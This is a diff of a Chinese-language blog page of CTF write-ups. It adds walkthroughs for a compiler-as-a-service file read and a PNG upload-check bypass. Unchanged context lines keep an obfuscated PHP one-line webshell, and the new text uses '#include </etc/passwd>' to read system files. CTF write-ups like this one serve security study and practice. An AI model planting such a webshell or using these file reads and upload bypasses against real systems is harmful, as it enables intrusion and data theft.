@@ -39,8 +39,16 @@
 <meta property="og:image" content="http://example.com/img/flagshopwhat3.png">
 <meta property="og:image" content="http://example.com/img/gshenmectfezphp1.png">
 <meta property="og:image" content="http://example.com/img/suctf2018getshell1.png">
+<meta property="og:image" content="http://example.com/img/fireshellctfcass1.png">
+<meta property="og:image" content="http://example.com/img/fireshellctfcss2.png">
+<meta property="og:image" content="http://example.com/img/fireshellctf4.png">
+<meta property="og:image" content="http://example.com/img/avatarupload1.png">
+<meta property="og:image" content="http://example.com/img/avauploader2.png">
+<meta property="og:image" content="http://example.com/img/avauploader3.png">
+<meta property="og:image" content="http://example.com/img/avauploader5.png">
+<meta property="og:image" content="http://example.com/img/avauploader6.png">
 <meta property="article:published_time" content="2023-12-28T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-12-30T14:00:21.915Z">
+<meta property="article:modified_time" content="2024-01-01T03:49:07.092Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="做题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -213,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          27k 字
+          30k 字
         
       </span>
     
@@ -224,7 +232,7 @@
         
         
         
-          226 分钟
+          247 分钟
         
       </span>
     
@@ -452,6 +460,41 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(融);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(匆);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(随);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(千);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(苦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(诗);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(尘);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(欣);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(站);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure>
 
 <p>上传后直接访问路径(注意它会自动把后缀改成<code>php</code>)，注意<code>flag</code>在<code>phpinfo</code>里，或者直接<code>system(&quot;env&quot;)</code>。</p>
+<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><img src="/img/fireshellctfcass1.png" srcset="/img/loading.gif" lazyload alt="fireshellctfcass1"></p>
+<p>编译页面，输入后会把结果下载出来。看了报错好像是个c的编译器？这里抓包看看是否存在任意文件下载：</p>
+<p><img src="/img/fireshellctfcss2.png" srcset="/img/loading.gif" lazyload alt="fireshellctfcss2"></p>
+<p>emm好像不存在了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54929891/article/details/124781749">参考文章</a></p>
+<blockquote>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> 命令告诉预处理器将指定头文件的内容插入到预处理器命令的相应位置</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p><code>#include &lt;/etc/passwd&gt;</code></p>
+<p>包含一个文件作为头文件时。会由于文件内容不能解析而报错</p>
+<p><img src="/img/fireshellctf4.png" srcset="/img/loading.gif" lazyload alt="fireshellctf4"></p>
+<p><code>#include &quot;/flag&quot;</code></p>
+<p>注意这里要用双引号包裹而不是箭头，双引号范围比箭头更大。</p>
+<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p><img src="/img/avatarupload1.png" srcset="/img/loading.gif" lazyload alt="avatarupload1"></p>
+<p>要求上传<code>PNG</code>而且小于<code>256kB</code>和<code>256px*256px</code>。</p>
+<p>找了个一句话木马传过去但是被检测了：</p>
+<p><img src="/img/avauploader2.png" srcset="/img/loading.gif" lazyload alt="avauploader2"></p>
+<p>这SESSION看着像<code>JWT</code>?，解一下看看:</p>
+<p><img src="/img/avauploader3.png" srcset="/img/loading.gif" lazyload alt="avauploader3"></p>
+<p>看到有个<code>type:error</code>，唉不会还是要找密钥解题吧。。</p>
+<p>后面看了下<code>wp</code>，发现原题是给了源码的</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>注意这两部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>finfo</code>函数判断要求图片形式是<code>PNG</code>，但接下来<code>getimagesize</code>函数要求图片形式不能是<code>PNG</code>。这里也用不着上传马，只要上传满足上面要求的图片就行。然后会把结果放到<code>JWT</code>里。</p>
+<p>这里应该有什么绕过姿势，参考：<code>https://blog.csdn.net/weixin_44037296/article/details/112604812</code></p>
+<blockquote>
+<p>函数<code>finfo_file()</code>其主要是识别<strong>PNG</strong>文件十六进制下的第一行信息，可以将png图片的第一行保留，其他全删掉，这样<code>finfo_file</code>获取到的是png，而<code>getimagesize</code>获取不到图片的相关信息<br>然后上传</p>
+</blockquote>
+<p>直接在burp里删就行，内容截止到<code>IDHR</code>:</p>
+<p><img src="/img/avauploader5.png" srcset="/img/loading.gif" lazyload alt="avauploader5"></p>
+<p><img src="/img/avauploader6.png" srcset="/img/loading.gif" lazyload alt="avauploader6"></p>
 
                 
               </div>
